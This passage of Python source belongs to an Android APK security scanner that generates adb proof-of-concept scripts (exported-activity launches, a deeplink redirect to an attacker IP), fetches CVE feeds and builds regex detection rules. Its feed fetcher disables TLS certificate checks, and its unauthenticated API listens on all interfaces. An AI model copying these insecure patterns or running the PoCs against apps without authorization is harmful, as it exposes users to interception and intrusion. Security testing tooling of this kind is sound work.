echo '    2. Search: grep -rn "ImageDecoder\\|MediaCodec\\|BitmapFactory" output/'
echo '    3. Trace data flow from untrusted input to decoder'
echo '    4. Craft malicious input exceeding expected buffer sizes'
echo '    5. Test with AddressSanitizer enabled for crash confirmation'
echo ''
echo '[2] For crash confirmation (requires rooted device):'
adb shell setprop wrap.$PKG 'ASAN_OPTIONS=detect_leaks=0'
echo '    Launch app and feed malicious input'
echo '    Check: adb logcat | grep -i "ASAN\\|overflow\\|heap-buffer"'
echo ''
echo '[+] If crash confirmed, this is a reportable CVE candidate!'
echo '    Report to: https://issuetracker.google.com/issues/new (Android Security)'
""".format(title=f.title, cwe=f.cwe, cvss=f.cvss, pkg=pkg, apk=apk, evidence=f.evidence[:100])}

    # Generic fallback for other findings
    if not poc:
        poc = {"desc": "Automated verification script for {}".format(f.title),
         "script": """#!/bin/bash
# PoC: {title}
# Severity: {sev} | CWE: {cwe} | CVSS: {cvss}
PKG='{pkg}'
echo '[*] Verifying: {title}'
echo '  Severity: {sev}'
echo '  File: {file}:{line}'
echo '  Evidence: {evidence}'
echo ''
echo '[*] Manual verification steps:'
echo '  1. Decompile APK: jadx -d output/ {apk}'
echo '  2. Open file: {file}'
echo '  3. Go to line {line}'
echo '  4. Verify vulnerable pattern: {evidence}'
echo '  5. Test exploitation based on {cwe}'
""".format(title=f.title, sev=sev, cwe=f.cwe, cvss=f.cvss, pkg=pkg,
           file=f.file, line=f.line, evidence=f.evidence[:80], apk=apk)}

    return poc

def _generate_video_poc(findings, pkg, apk):
    """Generate ADB automation script for video PoC demonstration."""
    lines = ["#!/bin/bash",
        "# ApkViper Video PoC Demo Script",
        "# Target: {} ({})".format(pkg, apk),
        "# Generated: {}".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        "# INSTRUCTIONS: Run 'adb shell screenrecord /sdcard/poc_video.mp4 &' first",
        "# Then run this script. It performs all exploits with visual pauses.",
        "", "PKG='{}'".format(pkg), "APK='{}'".format(apk), "",
        "echo '=== Starting Video PoC Recording ==='",
        "echo 'Start screen recording: adb shell screenrecord /sdcard/poc.mp4 --time-limit 180 &'",
        "adb shell screenrecord /sdcard/poc_demo.mp4 --time-limit 180 &",
        "RECPID=$!", "sleep 2", ""]

    for i, f in enumerate(findings[:10]):  # Top 10 most critical
        lines.append("# === Finding {}: {} [{}] ===".format(i+1, f.title, f.severity))
        lines.append("echo ''")
        lines.append("echo '=== [{}/{}] {} — {} ==='".format(i+1, min(len(findings),10), f.severity, f.title))
        lines.append("sleep 2")

        title = f.title.lower()
        if "exported" in title:
            lines.append("echo '[*] Launching exported activities...'")
            lines.append("adb shell dumpsys package $PKG | grep -A1 'exported=true' | grep -oP '[\\w.]+Activity' | head -3 | while read act; do")
            lines.append("  echo \"  -> Opening: $act\"")
            lines.append("  adb shell am start -n $PKG/$act 2>/dev/null")
            lines.append("  sleep 2")
            lines.append("done")
        elif "backup" in title:
            lines.append("echo '[*] Triggering backup extraction...'")
            lines.append("echo '  adb backup -f backup.ab -apk $PKG'")
            lines.append("sleep 3")
        elif "cleartext" in title:
            lines.append("echo '[*] Demonstrating cleartext traffic capture...'")
            lines.append("echo '  All HTTP traffic visible to network attacker'")
            lines.append("sleep 3")
        elif "deeplink" in title:
            lines.append("echo '[*] Testing deeplink injection...'")
            lines.append("SCHEME=$(adb shell dumpsys package $PKG | grep -oP '(?<=scheme=\")[\\w]+' | head -1)")
            lines.append("if [ -n \"$SCHEME\" ]; then")
            lines.append("  ATTACKER_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '{{print $7}}' || echo '127.0.0.1')")
            lines.append("  adb shell am start -a android.intent.action.VIEW -d \"$SCHEME://test?redirect=https://$ATTACKER_IP:8443\"")
            lines.append("fi")
            lines.append("sleep 3")
        else:
            lines.append("echo '  Vulnerability confirmed in: {}'".format(f.file))
            lines.append("echo '  Evidence: {}'".format(f.evidence[:60]))
            lines.append("sleep 3")

    lines.extend(["", "echo ''", "echo '=== Video PoC Demo Complete ==='",
        "echo 'Stopping recording...'", "kill $RECPID 2>/dev/null", "sleep 2",
        "adb pull /sdcard/poc_demo.mp4 ./poc_{}.mp4 2>/dev/null".format(
            re.sub(r'[^a-zA-Z0-9]','_', pkg or 'unknown')[:30]),
        "echo '[+] Video saved: poc_{}.mp4'".format(
            re.sub(r'[^a-zA-Z0-9]','_', pkg or 'unknown')[:30])])
    return "\n".join(lines)

# ============================================================
#  LIVE THREAT FEED ENGINE  (NVD + GitHub Advisory auto-fetch)
# ============================================================
_LIVE_FEED_CACHE = os.path.join(SESSION_DIR, "live_feed_cache.json")
_LIVE_RULES_FILE = os.path.join(SESSION_DIR, "live_rules.json")

def load_cached_feed():
    """Load cached CVE feed from disk."""
    if os.path.isfile(_LIVE_FEED_CACHE):
        try:
            return json.loads(Path(_LIVE_FEED_CACHE).read_text(encoding="utf-8"))
        except:
            pass
    return None

def _save_feed_cache(cves):
    """Save fetched CVEs to cache."""
    os.makedirs(SESSION_DIR, exist_ok=True)
    data = {"fetched": datetime.now(timezone.utc).isoformat(), "count": len(cves), "cves": cves}
    Path(_LIVE_FEED_CACHE).write_text(json.dumps(data, indent=2), encoding="utf-8")

def _save_live_rules(rules):
    """Persist live rules to disk."""
    os.makedirs(SESSION_DIR, exist_ok=True)
    Path(_LIVE_RULES_FILE).write_text(json.dumps(rules, indent=2), encoding="utf-8")

def _load_live_rules():
    """Load persisted live rules from disk into scanner."""
    global _LIVE_RULES
    if os.path.isfile(_LIVE_RULES_FILE):
        try:
            _LIVE_RULES = json.loads(Path(_LIVE_RULES_FILE).read_text(encoding="utf-8"))
        except:
            _LIVE_RULES = []

def fetch_live_feed(progress_cb=None):
    """Fetch latest Android CVEs from NVD (NIST) and GitHub Advisory DB."""
    cves = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # ── Source 1: NVD NIST (Android keyword, last 120 days) ──
    if progress_cb:
        progress_cb(5, "Fetching from NVD (NIST)...")
    try:
        nvd_url = "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=android&resultsPerPage=40"
        req = urllib.request.Request(nvd_url, headers={"User-Agent": "ApkViper/2.0"})
        resp = urllib.request.urlopen(req, timeout=20, context=ctx)
        data = json.loads(resp.read().decode("utf-8"))
        for vuln in data.get("vulnerabilities", []):
            cve_item = vuln.get("cve", {})
            cve_id = cve_item.get("id", "")
            descriptions = cve_item.get("descriptions", [])
            desc = ""
            for d in descriptions:
                if d.get("lang") == "en":
                    desc = d.get("value", "")
                    break
            if not desc and descriptions:
                desc = descriptions[0].get("value", "")
            # Get CVSS
            metrics = cve_item.get("metrics", {})
            cvss = 0.0
            sev = "MEDIUM"
            for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                mlist = metrics.get(key, [])
                if mlist:
                    cvss_data = mlist[0].get("cvssData", {})
                    cvss = cvss_data.get("baseScore", 0.0)
                    base_sev = mlist[0].get("baseSeverity", "") or cvss_data.get("baseSeverity", "")
                    if base_sev:
                        sev = base_sev.upper()
                    break
            if cvss == 0:
                continue
            # CWE
            cwe = ""
            weaknesses = cve_item.get("weaknesses", [])
            for w in weaknesses:
                for wd in w.get("description", []):
                    if wd.get("value", "").startswith("CWE-"):
                        cwe = wd["value"]
                        break
                if cwe:
                    break
            published = cve_item.get("published", "")[:10]
            cves.append({
                "id": cve_id, "name": cve_id, "sev": sev, "cvss": cvss,
                "cwe": cwe, "desc": desc[:500], "published": published,
                "source": "NVD"
            })
    except Exception as e:
        if progress_cb:
            progress_cb(20, "NVD fetch partial: {}".format(str(e)[:60]))

    if progress_cb:
        progress_cb(40, "Fetched {} from NVD. Querying GitHub Advisory...".format(len(cves)))

    # ── Source 2: GitHub Advisory DB (Maven/Android ecosystem) ──
    try:
        gh_url = "https://api.github.com/advisories?ecosystem=maven&per_page=30&type=reviewed"
        req = urllib.request.Request(gh_url, headers={
            "User-Agent": "ApkViper/2.0",
            "Accept": "application/vnd.github+json"
        })
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        data = json.loads(resp.read().decode("utf-8"))
        for adv in data:
            ghsa_id = adv.get("ghsa_id", "")
            cve_id = adv.get("cve_id") or ghsa_id
            desc = adv.get("summary", "") or adv.get("description", "")
            sev = (adv.get("severity") or "medium").upper()
            cvss_obj = adv.get("cvss", {})
            cvss = cvss_obj.get("score", 0.0) if cvss_obj else 0.0
            cwe_list = adv.get("cwes", [])
            cwe = cwe_list[0].get("cwe_id", "") if cwe_list else ""
            published = (adv.get("published_at") or "")[:10]
            if cvss > 0 and ("android" in desc.lower() or "android" in str(adv.get("identifiers", "")).lower()):
                cves.append({
                    "id": cve_id, "name": ghsa_id, "sev": sev, "cvss": cvss,
                    "cwe": cwe, "desc": desc[:500], "published": published,
                    "source": "GitHub"
                })
    except Exception as e:
        if progress_cb:
            progress_cb(60, "GitHub Advisory partial: {}".format(str(e)[:60]))

    if progress_cb:
        progress_cb(75, "Total {} CVEs fetched. Generating rules...".format(len(cves)))

    # Sort by CVSS descending
    cves.sort(key=lambda c: c.get("cvss", 0), reverse=True)

    # Cache results
    _save_feed_cache(cves)

    if progress_cb:
        progress_cb(90, "Cached {} CVEs. Generating detection rules...".format(len(cves)))

    return cves

def generate_live_rules(cves):
    """Auto-generate regex detection rules from CVE descriptions."""
    rules = []
    rule_id_counter = 1

    # Keyword-to-regex mapping for auto-rule generation
    _KEYWORD_PATTERNS = [
        (["buffer overflow", "heap overflow", "out-of-bounds write"], r'(?i)(memcpy|strcpy|strncpy|memmove|sprintf|BufferOverflow|HeapCorruption)', "CWE-120"),
        (["sql injection", "sqli"], r'(?i)(rawQuery|execSQL)\s*\(\s*["\'][^"\']*\+', "CWE-89"),
        (["path traversal", "directory traversal", "zip slip"], r'(?i)(ZipEntry|getCanonicalPath|\.\./).*?(extract|write|open)', "CWE-22"),
        (["deserialization", "unmarshall", "parcel"], r'(?i)(readParcelable|readSerializable|ObjectInputStream|unmarshall)', "CWE-502"),
        (["command injection", "os command"], r'(?i)Runtime\.getRuntime\(\)\.exec\s*\([^)]*\+', "CWE-78"),
        (["xss", "cross-site scripting", "javascript injection"], r'(?i)(evaluateJavascript|loadUrl|addJavascriptInterface)\s*\(', "CWE-79"),
        (["privilege escalation", "elevation of privilege"], r'(?i)(setUid|setGid|chmod|su\b|sudo|system\()', "CWE-269"),
        (["information disclosure", "data leak"], r'(?i)(Log\.(d|v|i|w|e)\s*\([^)]*?(password|token|secret|key))', "CWE-200"),
        (["certificate", "ssl", "tls", "mitm"], r'(?i)(TrustAllCerts|ALLOW_ALL_HOSTNAME|checkServerTrusted\s*\([^)]*\)\s*\{[\s]*\})', "CWE-295"),
        (["intent redirect", "intent hijack", "exported"], r'(?i)(startActivity|startService)\s*\(\s*(getIntent|intent\.get)', "CWE-940"),
        (["webview", "file access", "universal access"], r'(?i)setAllowUniversalAccessFromFileURLs\s*\(\s*true', "CWE-200"),
        (["hardcoded", "credential", "api key", "secret key"], r'(?i)(api[_-]?key|secret|password|token)\s*[=:]\s*["\'][A-Za-z0-9+/=_-]{12,}', "CWE-798"),
        (["broadcast", "implicit intent"], r'(?i)sendBroadcast\s*\(\s*new\s+Intent\s*\(', "CWE-927"),
        (["pending intent", "mutable"], r'(?i)PendingIntent\.get\w+\s*\([^)]*,\s*0\s*\)', "CWE-927"),
        (["clipboard", "paste"], r'(?i)ClipboardManager.*setPrimaryClip.*?(password|token|otp|secret)', "CWE-200"),
    ]

    seen_patterns = set()
    for cve in cves:
        desc_lower = cve.get("desc", "").lower()
        cve_id = cve.get("id", "")
        cve_sev = cve.get("sev", "MEDIUM")
        cve_cvss = cve.get("cvss", 5.0)
        cve_cwe = cve.get("cwe", "")

        for keywords, regex_pat, default_cwe in _KEYWORD_PATTERNS:
            if any(kw in desc_lower for kw in keywords):
                if regex_pat in seen_patterns:
                    continue
                seen_patterns.add(regex_pat)
                rule = {
                    "id": "AV-LIVE-{:03d}".format(rule_id_counter),
                    "name": "[Live] {} pattern".format(cve_id),
                    "sev": cve_sev if cve_sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO") else "MEDIUM",
                    "cwe": cve_cwe or default_cwe,
                    "owasp": "M7",
                    "regex": regex_pat,
                    "types": ["SOURCE"],
                    "desc": "Auto-generated from {}: {}".format(cve_id, cve.get("desc", "")[:200]),
                    "fix": "Review code for {} pattern. See {} for details.".format(
                        keywords[0], cve_id),
                    "cvss": cve_cvss
                }
                rules.append(rule)
                rule_id_counter += 1
                break  # One rule per CVE

    # Persist rules
    _save_live_rules(rules)

    return rules

# Load persisted live rules on startup
_load_live_rules()

# ============================================================
#  CLI
# ============================================================
def cli_scan(args):
    apk = args.scan
    if not os.path.isfile(apk):
        print("[ERROR] Not found:", apk); return 1
    print("[{}] v{} - Headless Scan".format(APP_NAME, VERSION))
    print("[*] Target:", os.path.basename(apk))
    print("[*] Extracting...")
    files, _ = extract_apk(apk)
    print("[+] {} files extracted".format(len(files)))
    print("[*] Scanning {} rules + taint + CVE discovery...".format(len(RULES)))
    t0 = time.time()
    findings = scan_files(files)
    elapsed = time.time() - t0
    sc = _sev_counts(findings)
    taint_count = sum(1 for f in findings if f.id.startswith("AV-TAINT"))
    cve_count = sum(1 for f in findings if f.id.startswith("AV-CVE"))
    flow_count = sum(1 for f in findings if f.id.startswith("AV-FLOW"))
    bin_count = sum(1 for f in findings if f.id.startswith("AV-BIN"))
    xcomp_count = sum(1 for f in findings if f.id.startswith("AV-XCOMP"))
    print("[+] {} unique findings in {:.1f}s (consolidated from multiple locations)".format(len(findings), elapsed))
    total_locs = sum(len(f.locations) if f.locations else 1 for f in findings)
    print("    Total occurrences: {} across {} unique vulnerabilities".format(total_locs, len(findings)))
    print("    Taint flows: {} | Cross-method: {} | Binary: {} | Cross-component: {} | CVE patterns: {}".format(
        taint_count, flow_count, bin_count, xcomp_count, cve_count))
    print("[+] C:{} H:{} M:{} L:{} I:{}".format(sc["CRITICAL"], sc["HIGH"], sc["MEDIUM"], sc["LOW"], sc["INFO"]))
    if cve_count > 0:
        print("[!!] {} POTENTIAL 0-DAY VULNERABILITIES DETECTED:".format(cve_count))
        for f in findings:
            if f.id.startswith("AV-CVE"):
                hits = len(f.locations) if f.locations else 1
                print("     -> [{}] {} (CVSS {}) [{} hit{}]".format(f.severity, f.title, f.cvss, hits, "s" if hits>1 else ""))
    if flow_count > 0:
        print("[!!] {} CROSS-METHOD DATAFLOW VULNERABILITIES:".format(flow_count))
        for f in findings:
            if f.id.startswith("AV-FLOW"):
                hits = len(f.locations) if f.locations else 1
                print("     -> [{}] {} (CVSS {}) [{} hit{}]".format(f.severity, f.title, f.cvss, hits, "s" if hits>1 else ""))
    if bin_count > 0:
        print("[!!] {} NATIVE BINARY SECURITY ISSUES:".format(bin_count))
        for f in findings:
            if f.id.startswith("AV-BIN"):
                hits = len(f.locations) if f.locations else 1
                print("     -> [{}] {} ({}) [{} hit{}]".format(f.severity, f.title, f.file, hits, "s" if hits>1 else ""))
    # Save session
    sp = save_session(os.path.basename(apk), files, findings)
    print("[+] Session saved:", sp)
    # Export report
    fmt = getattr(args, "format", "json") or "json"
    out = args.output or "{}_{}.{}".format(APP_NAME, os.path.basename(apk), fmt if fmt != "sarif" else "sarif.json")
    {"html": export_html, "csv": export_csv_report, "sarif": export_sarif}.get(fmt, export_json)(
        findings, os.path.basename(apk), out, files)
    print("[+] Report:", os.path.abspath(out))
    # Auto-generate PoC scripts
    comps = _extract_android_components(files)
    pkg = comps.get("package", "") or os.path.basename(apk).replace(".apk","")
    poc_dir = os.path.join(os.path.dirname(os.path.abspath(out)), "pocs_{}".format(pkg.replace(".","-") or "unknown"))
    pocs = generate_poc_scripts(findings, pkg, os.path.basename(apk), poc_dir)
    print("[+] {} PoC scripts generated in: {}".format(len(pocs), poc_dir))
    print("[+] Video PoC script: {}/video_poc_demo.sh".format(poc_dir))
    print("[+] Run all PoCs: bash {}/run_all_pocs.sh".format(poc_dir))
    ch = sc["CRITICAL"] + sc["HIGH"]
    if ch > 0:
        print("[!] FAIL - {} critical/high".format(ch)); return 2
    print("[+] PASS"); return 0

# ============================================================
#  REST API  (unchanged)
# ============================================================
class ApiHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _json(self, code, obj):
        b = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)
    def do_GET(self):
        if self.path == "/api/health":
            self._json(200, {"status": "ok", "version": VERSION})
        elif self.path == "/api/rules":
            self._json(200, [{"id": r["id"], "name": r["name"], "sev": r["sev"]} for r in RULES])
        else:
            self._json(404, {"error": "Not found"})
    def do_POST(self):
        if self.path == "/api/scan":
            try:
                l = int(self.headers.get("Content-Length", 0))
                data = self.rfile.read(l)
                tmp = tempfile.NamedTemporaryFile(suffix=".apk", delete=False)
                tmp.write(data); tmp.close()
                files, _ = extract_apk(tmp.name)
                findings = scan_files(files)
                os.unlink(tmp.name)
                self._json(200, {"total": len(findings), "findings": [f.to_dict() for f in findings]})
            except Exception as e:
                self._json(500, {"error": str(e)})
        else:
            self._json(404, {"error": "Not found"})

def start_server(port=8089):
    print("[{}] v{} - REST API".format(APP_NAME, VERSION))
    s = HTTPServer(("0.0.0.0", port), ApiHandler)
    print("[+] http://localhost:{}".format(port))
    print("    GET /api/health | GET /api/rules | POST /api/scan")
    try: s.serve_forever()
    except KeyboardInterrupt: print("\n[*] Stopped")

# ============================================================
#  GUI  (Android Application Security Scanner Interface)
# ============================================================
def launch_gui():
    try:
        import tkinter as tk
        from tkinter import ttk, filedialog, messagebox, scrolledtext
    except ImportError:
        print("[ERROR] tkinter not available."); sys.exit(1)

    # ── Color Palette ──
    BG      = "#0f1318"
    BG2     = "#161c24"
    BG3     = "#1e2730"
    BG_CARD = "#1a2233"
    BORDER  = "#2a3444"
    FG      = "#e0e6ed"
    FG2     = "#8899aa"
    FG3     = "#556677"
    ACC     = "#4da6ff"
    ACC2    = "#1a73e8"
    RED     = "#ff4d6a"
    ORANGE  = "#ff8c42"
    YELLOW  = "#ffc857"
    GREEN   = "#42d392"
    PURPLE  = "#b388ff"
    SEVC    = {"CRITICAL": RED, "HIGH": ORANGE, "MEDIUM": YELLOW, "LOW": ACC, "INFO": FG2}
    FONT    = "Segoe UI"
    MONO    = "Consolas"

    state = {"files": OrderedDict(), "findings": [], "apk": ""}

    root = tk.Tk()
    root.title("{} v{}  \u2014  Android Application Security Scanner".format(APP_NAME, VERSION))
    root.geometry("1600x1000")
    root.minsize(1200, 750)
    root.configure(bg=BG)

    # ── ttk Style ──
    style = ttk.Style()
    style.theme_use("clam")
    style.configure(".", background=BG, foreground=FG, fieldbackground=BG2, borderwidth=0)
    style.configure("TFrame", background=BG)
    style.configure("TLabel", background=BG, foreground=FG, font=(FONT, 10))
    style.configure("TButton", background=ACC2, foreground="#ffffff", font=(FONT, 10, "bold"),
                    padding=(16, 7), borderwidth=0)
    style.map("TButton", background=[("active", ACC), ("pressed", "#1557b0")])
    style.configure("Secondary.TButton", background=BG3, foreground=FG, font=(FONT, 10),
                    padding=(14, 7), borderwidth=0)
    style.map("Secondary.TButton", background=[("active", BORDER)])
    style.configure("TNotebook", background=BG, borderwidth=0, tabmargins=[0, 0, 0, 0])
    style.configure("TNotebook.Tab", background=BG2, foreground=FG2,
                    font=(FONT, 9, "bold"), padding=[14, 7], borderwidth=0)
    style.map("TNotebook.Tab", background=[("selected", BG)], foreground=[("selected", ACC)])
    style.configure("Treeview", background=BG2, foreground=FG, fieldbackground=BG2,
                    rowheight=28, font=(FONT, 10), borderwidth=0)
    style.configure("Treeview.Heading", background=BG3, foreground=ACC,
                    font=(FONT, 10, "bold"), borderwidth=0, relief="flat")
    style.map("Treeview", background=[("selected", "#1a3a5c")])
    style.configure("TProgressbar", background=ACC, troughcolor=BG3, borderwidth=0, thickness=6)
    style.configure("TSeparator", background=BORDER)
    style.configure("TPanedwindow", background=BORDER)

    # ── Generic scroll helper for all canvas-scrolled tabs ──
    # ── Scrollable canvas registry and global scroll handler ──
    _canvas_map = {}  # tab_index -> canvas

    def _register_scrollable(tab_idx, canvas, inner):
        """Register a canvas as scrollable for a notebook tab."""
        _canvas_map[tab_idx] = canvas
        def _on_configure(e):
            canvas.configure(scrollregion=canvas.bbox("all"))
        inner.bind("<Configure>", _on_configure)

    def _global_scroll(event):
        """Single global handler: scroll whichever canvas tab is active."""
        try:
            idx = nb.index(nb.select())
            cv = _canvas_map.get(idx)
            if cv and cv.winfo_exists():
                cv.yview_scroll(int(-1 * (event.delta / 120)), "units")
        except:
            pass

    def _global_scroll_up(event):
        try:
            idx = nb.index(nb.select())
            cv = _canvas_map.get(idx)
            if cv and cv.winfo_exists():
                cv.yview_scroll(-3, "units")
        except:
            pass

    def _global_scroll_down(event):
        try:
            idx = nb.index(nb.select())
            cv = _canvas_map.get(idx)
            if cv and cv.winfo_exists():
                cv.yview_scroll(3, "units")
        except:
            pass

    # ── Helper: create a card frame ──
    def make_card(parent, **kw):
        f = tk.Frame(parent, bg=BG_CARD, highlightbackground=BORDER,
                     highlightthickness=1, padx=kw.get("px", 16), pady=kw.get("py", 12))
        return f

    # ── Header Bar ──
    header = tk.Frame(root, bg=BG2, height=56)
    header.pack(fill="x")
    header.pack_propagate(False)
    # Logo / title
    tk.Label(header, text="\U0001f40d", font=(FONT, 20), bg=BG2, fg=ACC).pack(side="left", padx=(16, 6))
    tk.Label(header, text=APP_NAME, font=(FONT, 16, "bold"), bg=BG2, fg="#ffffff").pack(side="left")
    tk.Label(header, text="v{}".format(VERSION), font=(FONT, 10), bg=BG2, fg=FG2).pack(side="left", padx=(6, 0), pady=(4, 0))
    tk.Frame(header, bg=BORDER, width=1).pack(side="left", fill="y", padx=16, pady=10)
    tk.Label(header, text="Android Application Security Scanner", font=(FONT, 11), bg=BG2, fg=FG2).pack(side="left")

    # Right side of header — action buttons
    pb = ttk.Progressbar(header, length=180, mode="determinate")
    pb.pack(side="right", padx=(0, 16), pady=18)

    def open_apk():
        p = filedialog.askopenfilename(filetypes=[("APK files", "*.apk"), ("All files", "*.*")])
        if p: load_apk(p)

    def load_apk(path):
        sv.set("\u23f3  Extracting APK...")
        pb.configure(value=0); root.update()
        state["_extract_start"] = time.time()
        def _extract_progress(pct, name):
            elapsed = time.time() - state["_extract_start"]
            if pct > 2:
                eta = (elapsed / pct) * (100 - pct)
                eta_str = "{:.0f}s".format(eta) if eta < 60 else "{:.0f}m {:.0f}s".format(eta // 60, eta % 60)
            else:
                eta_str = "..."
            elapsed_str = "{:.0f}s".format(elapsed)
            root.after(0, lambda: pb.configure(value=pct))
            root.after(0, lambda: sv.set("\u23f3  Extracting...  {}%  |  Elapsed: {}  |  ETA: ~{}  |  {}".format(
                int(pct), elapsed_str, eta_str, name.split("/")[-1] if "/" in name else name)))
        def worker():
            try:
                f, t = extract_apk(path, progress_cb=_extract_progress)
                state["files"] = f; state["apk"] = os.path.basename(path)
                root.after(0, lambda: on_extract_done(f))
            except Exception as e:
                root.after(0, lambda: messagebox.showerror("Error", str(e)))
        threading.Thread(target=worker, daemon=True).start()

    def on_extract_done(f):
        ft.delete(*ft.get_children())
        for p in sorted(f.keys()):
            parts = p.split("/"); par = ""
            for j, pt in enumerate(parts):
                nid = "/".join(parts[:j + 1])
                if not ft.exists(nid):
                    ft.insert(par, "end", iid=nid, text="  " + pt, open=(j < 2))
                par = nid
        sv.set("\u2705  Loaded: {}  |  {} files extracted".format(state["apk"], len(f)))
        pb.configure(value=100)
        nb.select(0)

    def do_scan():
        if not state["files"]:
            messagebox.showwarning("Scan", "Open an APK first."); return
        sv.set("\U0001f50d  Scanning {} rules + taint analysis...".format(len(RULES)))
        pb.configure(value=0); root.update()
        state["_scan_start"] = time.time()
        def _update_progress(pct, msg):
            elapsed = time.time() - state["_scan_start"]
            if pct > 2:
                eta = (elapsed / pct) * (100 - pct)
                eta_str = "{:.0f}s".format(eta) if eta < 60 else "{:.0f}m {:.0f}s".format(eta // 60, eta % 60)
            else:
                eta_str = "calculating..."
            elapsed_str = "{:.0f}s".format(elapsed) if elapsed < 60 else "{:.0f}m {:.0f}s".format(elapsed // 60, elapsed % 60)
            root.after(0, lambda: pb.configure(value=pct))
            root.after(0, lambda: sv.set("\U0001f50d  Scanning...  {}%  |  Elapsed: {}  |  ETA: ~{}  |  {}".format(
                int(pct), elapsed_str, eta_str, msg)))
        def worker():
            fi = scan_files(state["files"], _update_progress)
            state["findings"] = fi
            try: save_session(state["apk"], state["files"], fi)
            except: pass
            root.after(0, lambda: on_scan_done(fi))
        threading.Thread(target=worker, daemon=True).start()

    def on_scan_done(fi):
        pb.configure(value=100)
        elapsed = time.time() - state.get("_scan_start", time.time())
        elapsed_str = "{:.1f}s".format(elapsed) if elapsed < 60 else "{:.0f}m {:.0f}s".format(elapsed // 60, elapsed % 60)
        sc = _sev_counts(fi)
        taint_n = sum(1 for f in fi if f.id.startswith("AV-TAINT"))
        sv.set("\u2705  {} findings in {}  |  {} taint flows  |  CRIT: {}  HIGH: {}  MED: {}  LOW: {}  INFO: {}".format(
            len(fi), elapsed_str, taint_n, sc["CRITICAL"], sc["HIGH"], sc["MEDIUM"], sc["LOW"], sc["INFO"]))
        for w in dash_inner.winfo_children(): w.destroy()
        _build_dashboard(dash_inner, fi, sc)
        ftree.delete(*ftree.get_children())
        for i, f in enumerate(fi):
            tag = "even" if i % 2 == 0 else "odd"
            hits = len(f.locations) if f.locations else 1
            short_file = f.file.split("/")[-1] if "/" in f.file else f.file
            loc_display = short_file if hits == 1 else "{} (+{} more)".format(short_file, hits - 1)
            ftree.insert("", "end", values=(f.id, f.severity, f.title, f.cwe, hits, loc_display, f.line, f.cvss), tags=(tag,))
        # Rebuild Exploits tab with real package name
        comps_scan = _extract_android_components(state["files"])
        _pkg_scan = comps_scan.get("package", "") or ""
        _apk_scan = state.get("apk", "") or ""
        _build_exploits_tab(ex_inner, _pkg_scan, _apk_scan)
        # Rebuild Zero-Day tab with scan results
        _build_zeroday_tab(zd_inner, fi)
        nb.select(0)

    def do_export():
        if not state["findings"]:
            messagebox.showwarning("Export", "Run scan first."); return
        fmt = ev.get()
        ext = {"HTML": ".html", "PDF": ".pdf", "Word": ".docx", "Excel": ".xlsx", "JSON": ".json", "CSV": ".csv", "SARIF": ".sarif.json"}[fmt]
        p = filedialog.asksaveasfilename(
            defaultextension=ext,
            initialfile="{}_{}.{}".format(APP_NAME, state["apk"], ext.lstrip(".")))
        if not p: return
        try:
            {"HTML": export_html, "PDF": export_pdf, "Word": export_docx, "Excel": export_xlsx,
             "JSON": export_json, "CSV": export_csv_report,
             "SARIF": export_sarif}[fmt](state["findings"], state["apk"], p, state["files"])
            sv.set("\U0001f4e4  Exported: " + p)
            if fmt == "HTML": webbrowser.open("file://" + os.path.abspath(p))
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def do_load_session():
        sessions = list_sessions()
        if not sessions:
            messagebox.showinfo("Sessions", "No saved sessions found."); return
        p = filedialog.askopenfilename(initialdir=SESSION_DIR, filetypes=[("Session", "*.session.json")])
        if not p: return
        try:
            apk_name, findings = load_session(p)
            state["apk"] = apk_name; state["findings"] = findings
            on_scan_done(findings)
            sv.set("\U0001f4c2  Restored session: " + apk_name)
        except Exception as e:
            messagebox.showerror("Error", str(e))

    # ── Toolbar ──
    toolbar = tk.Frame(root, bg=BG, pady=8, padx=12)
    toolbar.pack(fill="x")
    ttk.Button(toolbar, text="\U0001f4c1  Open APK", command=open_apk).pack(side="left", padx=(0, 6))
    ttk.Button(toolbar, text="\U0001f50d  Scan", command=do_scan).pack(side="left", padx=6)
    tk.Frame(toolbar, bg=BORDER, width=1, height=28).pack(side="left", padx=12)
    ev = tk.StringVar(value="HTML")
    fmt_menu = ttk.OptionMenu(toolbar, ev, "HTML", "HTML", "PDF", "Word", "Excel", "JSON", "CSV", "SARIF")
    fmt_menu.pack(side="left", padx=6)
    ttk.Button(toolbar, text="\U0001f4e4  Export", command=do_export, style="Secondary.TButton").pack(side="left", padx=6)
    tk.Frame(toolbar, bg=BORDER, width=1, height=28).pack(side="left", padx=12)
    ttk.Button(toolbar, text="\U0001f4c2  Load Session", command=do_load_session, style="Secondary.TButton").pack(side="left", padx=6)

    # ── Main Layout (PanedWindow) ──
    pw = ttk.PanedWindow(root, orient="horizontal")
    pw.pack(fill="both", expand=True, padx=8, pady=(0, 4))

    # Left panel: File tree
    left = tk.Frame(pw, bg=BG2, highlightbackground=BORDER, highlightthickness=1)
    tree_header = tk.Frame(left, bg=BG3, height=36)
    tree_header.pack(fill="x")
    tree_header.pack_propagate(False)
    tk.Label(tree_header, text="  \U0001f4c1  APK File Tree", font=(FONT, 10, "bold"),
             bg=BG3, fg=ACC, anchor="w").pack(fill="x", padx=8, pady=6)
    ft = ttk.Treeview(left, show="tree")
    ft_sb = ttk.Scrollbar(left, orient="vertical", command=ft.yview)
    ft.configure(yscrollcommand=ft_sb.set)
    ft_sb.pack(side="right", fill="y")
    ft.pack(fill="both", expand=True)
    pw.add(left, weight=1)

    def on_tree_select(e):
        s = ft.selection()
        if not s: return
        content = state["files"].get(s[0], "")
        if content:
            ct.configure(state="normal"); ct.delete("1.0", "end")
            ct.insert("1.0", content)
            _syntax_highlight(ct)
            ct.configure(state="disabled")
            nb.select(source_tab_idx)
    ft.bind("<<TreeviewSelect>>", on_tree_select)

    # Right panel: Notebook
    right = tk.Frame(pw, bg=BG)
    nb = ttk.Notebook(right)
    nb.pack(fill="both", expand=True)
    pw.add(right, weight=4)

